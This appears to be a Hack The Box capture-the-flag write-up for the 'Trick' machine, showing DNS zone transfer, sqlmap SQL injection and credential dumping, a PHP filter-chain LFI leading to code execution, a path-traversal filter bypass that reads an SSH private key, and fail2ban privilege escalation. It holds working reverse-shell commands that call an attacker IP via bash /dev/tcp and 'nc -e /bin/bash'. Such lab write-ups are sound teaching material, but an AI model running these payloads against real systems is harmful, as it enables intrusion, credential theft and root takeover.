---
title: "HTB Trick Writeup"
description: In this machine, we perform asynchronous data transfer to discover a hidden subdomain. The website on this subdomain is vulnerable to a local file inclusion vulnerability. We can immediately pop a shell as www-data or retrieve the id_rsa key of user michael. Michael is part of the security group, who has sudo access to fail2ban start. Leveraging GTFObins, we can escalate privileges to root.
date: 2026-04-10T23:27:47-04:00
image: 1.png
tags:
    - HTB
categories:
    - htb-writeups
comments: false
---

## Port Scan
1. All TCP Port scan
```
sudo nmap -Pn 10.129.227.180 -sS -p- --min-rate 20000 -oN nmap/allTcpPortScan.nmap
```
Output:
```
Nmap scan report for 10.129.227.180
Host is up (7.0s latency).
Not shown: 60975 filtered tcp ports (no-response), 4556 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
25/tcp open  smtp
53/tcp open  domain
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 14.60 seconds
```
2. All UDP port scan
```
sudo nmap -Pn 10.129.227.180 -sU -p- --min-rate 20000 -oN nmap/allUdpPortScan.nmap
```
Output:
```
Nmap scan report for 10.129.227.180
Host is up (4.9s latency).
Not shown: 65457 open|filtered udp ports (no-response), 77 closed udp ports (port-unreach)
PORT   STATE SERVICE
53/udp open  domain

Nmap done: 1 IP address (1 host up) scanned in 108.06 seconds
```
3. Script and version scan
```
sudo nmap -Pn 10.129.227.180 -sCV -p22,25,53,80 --min-rate 20000 -oN nmap/scriptVersionScan.nmap
```
Output:
```
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-06 07:26 EST
Nmap scan report for 10.129.227.180
Host is up (0.18s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)
|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)
|_  256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)
25/tcp open  smtp?
|_smtp-commands: Couldn't establish connection on port 25
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
80/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Coming Soon - Start Bootstrap Theme
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 242.67 seconds
```
## Service
1. Email service
```
telnet 10.129.227.180 25
```
Output:
```
220 debian.localdomain ESMTP Postfix (Debian/GNU)

```
### DNS
1. We can get the domain name of the server like this
```
dig -x 10.129.227.180 @10.129.227.180
```
Output:
```
; <<>> DiG 9.20.4-4-Debian <<>> -x 10.129.227.180 @10.129.227.180
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 21573
;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 3
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: fd9ff80ddb8e5b262e4562d16985e41606c4fc06cc5a2ddc (good)
;; QUESTION SECTION:
;180.227.129.10.in-addr.arpa.   IN      PTR

;; ANSWER SECTION:
180.227.129.10.in-addr.arpa. 604800 IN  PTR     trick.htb.

;; AUTHORITY SECTION:
227.129.10.in-addr.arpa. 604800 IN      NS      trick.htb.

;; ADDITIONAL SECTION:
trick.htb.              604800  IN      A       127.0.0.1
trick.htb.              604800  IN      AAAA    ::1

;; Query time: 180 msec
;; SERVER: 10.129.227.180#53(10.129.227.180) (UDP)
;; WHEN: Fri Feb 06 07:49:37 EST 2026
;; MSG SIZE  rcvd: 165
```
2. We can use AXFR to transfer the domain names.
```
dig AXFR trick.htb @10.129.227.180
```
Output:
```
; <<>> DiG 9.20.4-4-Debian <<>> AXFR trick.htb @10.129.227.180
;; global options: +cmd
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.              604800  IN      NS      trick.htb.
trick.htb.              604800  IN      A       127.0.0.1
trick.htb.              604800  IN      AAAA    ::1
preprod-payroll.trick.htb. 604800 IN    CNAME   trick.htb.
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
;; Query time: 175 msec
;; SERVER: 10.129.227.180#53(10.129.227.180) (TCP)
;; WHEN: Fri Feb 06 07:53:33 EST 2026
;; XFR size: 6 records (messages 1, bytes 231)
```
- Add `preprod-payroll.trick.htb` to `/etc/hosts`
## Web Research
1. The website does not look very interesting
![htb-index1](htb-index1.png)
2. Directory fuzzing
```
ffuf -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://10.129.227.180/FUZZ -ic -o root_dir_fuzz.txt
```
- Nothing interesting
3. From Asynchronous Zone Transfer, we found another domain.
![htb-index2.png](htb-index2.png)
4. We can get a valid employee from `http://preprod-payroll.trick.htb/index.php?page=employee`
![htb-index3.png](htb-index3.png)
5. We are able to retrieve information about the user here
![htb-index4.png](htb-index4.png)
6. I think the application is vulnerable to SQL Injection
```http
POST /ajax.php?action=login HTTP/1.1

Host: preprod-payroll.trick.htb

username=john'--&password=john
```
Output:
```html
<br />
<b>Notice</b>:  Trying to get property 'num_rows' of non-object in <b>/var/www/payroll/admin_class.php</b> on line <b>21</b><br />
3
```
7. Out of ideas, so running SQLMap on the login form
```sh
sqlmap -u 'http://preprod-payroll.trick.htb/ajax.php?action=login' --data "username=john&password=john" --level 5 --risk 2 --batch 
```
Output:
```
sqlmap identified the following injection point(s) with a total of 517 HTTP(s) requests:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: username=john' AND 4892=(SELECT (CASE WHEN (4892=4892) THEN 4892 ELSE (SELECT 9108 UNION SELECT 2793) END))-- jesd&password=john

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: username=john' OR (SELECT 2341 FROM(SELECT COUNT(*),CONCAT(0x7176706a71,(SELECT (ELT(2341=2341,1))),0x71706b7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- GEZI&password=john

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=john' AND (SELECT 9356 FROM (SELECT(SLEEP(5)))PbPC)-- tgsv&password=john
---
[09:38:20] [INFO] the back-end DBMS is MySQL
web application technology: PHP, Nginx 1.14.2
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
```
- Interesting
8. We can enumerate the databases available.
```sh
sqlmap -u 'http://preprod-payroll.trick.htb/ajax.php?action=login' --data "username=john&password=john" --level 5 --risk 2 --batch --dbs
```
Output:
```
available databases [2]:
[*] information_schema
[*] payroll_db
```
Tables in `payroll_db`
```
sqlmap -u 'http://preprod-payroll.trick.htb/ajax.php?action=login' --data "username=john&password=john" --level 5 --risk 2 --batch -D payroll_db --tables
```
Output:
```
Database: payroll_db
[11 tables]
+---------------------+
| position            |
| allowances          |
| attendance          |
| deductions          |
| department          |
| employee            |
| employee_allowances |
| employee_deductions |
| payroll             |
| payroll_items       |
| users               |
+---------------------+
```
Contents of `users` table
```sh
sqlmap -u 'http://preprod-payroll.trick.htb/ajax.php?action=login' --data "username=john&password=john" --level 5 --risk 2 --batch -D payroll_db -T users --dump
```
Output:
```
Database: payroll_db
Table: users
[1 entry]
+----+-----------+---------------+--------+---------+---------+-----------------------+------------+
| id | doctor_id | name          | type   | address | contact | password              | username   |
+----+-----------+---------------+--------+---------+---------+-----------------------+------------+
| 1  | 0         | Administrator | 1      | <blank> | <blank> | SuperGucciRainbowCake | Enemigosss |
+----+-----------+---------------+--------+---------+---------+-----------------------+------------+
```
Contents of `employee` table
```sh
sqlmap -u 'http://preprod-payroll.trick.htb/ajax.php?action=login' --data "username=john&password=john" --level 5 --risk 2 --batch -D payroll_db -T employee --dump
```
Output:
```
Database: payroll_db
Table: employee
[1 entry]
+----+-------------+---------------+--------+----------+-----------+------------+-------------+
| id | position_id | department_id | salary | lastname | firstname | middlename | employee_no |
+----+-------------+---------------+--------+----------+-----------+------------+-------------+
| 9  | 1           | 1             | 30000  | Smith    | John      | C          | 2020-9838   |
+----+-------------+---------------+--------+----------+-----------+------------+-------------+
```
9. To get the current user,
```sh
sqlmap -u 'http://preprod-payroll.trick.htb/ajax.php?action=login' --data "username=john&password=john" --level 5 --risk 2 --batch --current-user
```
Output:
```
current user: 'remo@localhost'
```
10. We have local file disclosure on the server via MySQL
```
sqlmap -u 'http://preprod-payroll.trick.htb/ajax.php?action=login' --data "username=john&password=john" --level 5 --risk 2 --batch --file-read="/etc/passwd"
```
Output:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
tss:x:105:111:TPM2 software stack,,,:/var/lib/tpm:/bin/false
dnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:108:114:RealtimeKit,,,:/proc:/usr/sbin/nologin
pulse:x:109:118:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
speech-dispatcher:x:110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
saned:x:112:121::/var/lib/saned:/usr/sbin/nologin
colord:x:113:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
geoclue:x:114:123::/var/lib/geoclue:/usr/sbin/nologin
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
Debian-gdm:x:116:124:Gnome Display Manager:/var/lib/gdm3:/bin/false
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:117:125:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:118:65534::/run/sshd:/usr/sbin/nologin
postfix:x:119:126::/var/spool/postfix:/usr/sbin/nologin
bind:x:120:128::/var/cache/bind:/usr/sbin/nologin
michael:x:1001:1001::/home/michael:/bin/bash
```
11. Tried downloading `/var/www/payroll/admin_class.php`
```
sqlmap -u 'http://preprod-payroll.trick.htb/ajax.php?action=login' --data "username=john&password=john" --level 5 --risk 2 --batch --file-read="/var/www/payroll/admin_class.php"
```
Output:
```php
<?php
session_start();
ini_set('display_errors', 1);
Class Action {
        private $db;

        public function __construct() {
                ob_start();
        include 'db_connect.php';
    
    $this->db = $conn;

```
12. Download `/var/www/payroll/db_connect.php`
```php
<?php 

$conn= new mysqli('localhost','remo','TrulyImpossiblePasswordLmao123','payroll_db')or die("Could not connect to mysql".mysqli_error($con));
```
12. We cannot ssh into the server with the creds.
```
ssh Enemigosss@trick.htb
```
13. File write failed
```
sqlmap -u 'http://preprod-payroll.trick.htb/ajax.php?action=login' --data "username=john&password=john" --level 5 --risk 2 --batch --file-write="/home/kali/hackthebox/Trick/webshell.php" --file-dest="/var/www/payroll/shell.php"
```
## LFI -> RCE
1. In the source code of `/var/www/payroll/index.php`, I saw this
```php
<?php $page = isset($_GET['page']) ? $_GET['page'] :'home'; ?>
<?php include $page.'.php' ?>
```
2. We can use PHP Wrappers to achieve [RCE without a file write](https://github.com/synacktiv/php_filter_chain_generator). As a POC, I just paste the example payload in the repo.
![htb-index5.png](htb-index5.png)
3. To generate our payload,
```
python3 php_filter_chain_generator.py --chain '<?php echo `$_GET[0]`; ?>  ' > payload
```
Output:
![htb-index6](htb-index6.png)
- RCE yay
4. To get a reverse shell,
```http
GET /index.php?0=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.29/7777+0>%261'&page=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.ic<SNIP>
```
Start a listener
```
nc -lvnp 7777
listening on [any] 7777 ...
connect to [10.10.14.29] from (UNKNOWN) [10.129.227.180] 46316
bash: cannot set terminal process group (711): Inappropriate ioctl for device
bash: no job control in this shell
www-data@trick:~/payroll$ 
```
## Shell as www-data
1. ID
```
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
2. Hmm there is a `market` directory?
```
ls
html  market  payroll
```
3. According to `nginx`, there is
```
cat /etc/nginx/sites-enabled/*
```
Output:
```nginx
server {
        listen 80;
        listen [::]:80;

        server_name preprod-marketing.trick.htb;

        root /var/www/market;
        index index.php;

        location / {
                try_files $uri $uri/ =404;
        }

        location ~ \.php$ {
                include snippets/fastcgi-php.conf;
                fastcgi_pass unix:/run/php/php7.3-fpm-michael.sock;
        }
}
```
13. Reading the index.php source code, we see a very weak WAF
```PHP
<?php
$file = $_GET['page'];

if(!isset($file) || ($file=="index.php")) {
   include("/var/www/market/home.html");
}
else{
        include("/var/www/market/".str_replace("../","",$file));
}
```
14. We can easily bypass the WAF like this
```
GET /index.php?page=..././..././..././etc/hosts HTTP/1.1
```
Output:
```
127.0.0.1 localhost
127.0.1.1 trick
```
15. We can retrieve the OpenSSH private key here
```http
GET /index.php?page=..././..././..././home/michael/.ssh/id_rsa HTTP/1.1
```
Output:
```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
<SNIP>
jsj51hLkyTIOBEVxNjDcPWOj5470u21X8qx2F3M4+YGGH+mka7P+VVfvJDZa67XNHzrxi+
IJhaN0D5bVMdjjFHAAAADW1pY2hhZWxAdHJpY2sBAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```
16. Tighten the file permissions
```
sudo chmod 700 id_rsa
```
17. To SSH into the server,
```sh
ssh michael@trick.htb -i ./id_rsa
```
Output:
```
michael@trick:~$ id
uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security)
```
## Shell as Michael
1. ID
```
id
uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security)
```
2. Let's see what is owned by `security`
```
find / -group security 2>/dev/null 
/etc/fail2ban/action.d
```
3. Sudo privileges
```
sudo -l
Matching Defaults entries for michael on trick:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User michael may run the following commands on trick:
    (root) NOPASSWD: /etc/init.d/fail2ban restart
```
4. Apparently, `fail2ban` has a directive called `actionstart` that will execute commands when `fail2ban` is started
First, we need to copy `iptables-multiport.conf` to `iptables-multiport.local`. `.local` is preferred over `.conf` apparently
```
cp /etc/fail2ban/action.d/iptables-multiport.conf /etc/fail2ban/action.d/iptables-multiport.local
```
Add these definitions in `/etc/fail2ban/action.d/iptables-multiport.local`
```
actionstart = /usr/bin/nc 10.10.14.29 9999 -e /bin/bash
actionstart_on_demand = false
```
5. Then, restart the daemon
```
sudo /etc/init.d/fail2ban restart
```
6. We get root!
```
nc -lvnp 9999                                                               
listening on [any] 9999 ...
connect to [10.10.14.29] from (UNKNOWN) [10.129.227.180] 47348
id
uid=0(root) gid=0(root) groups=0(root)
```

## Alternative
https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/fail2ban/
`fail2ban` is currently being applied on ssh only
```
cat defaults-debian.conf
[sshd]
enabled = true
```
We can write a ban action which will trigger when an attack attempt is detected
```
actionban = /usr/bin/nc 10.0.0.1 4444 -e /bin/bash
```
Restart the service
```
sudo /etc/init.d/fail2ban restart
```
Then bruteforce the server
```
hydra -l root -P passwords.txt <target-ip> ssh
```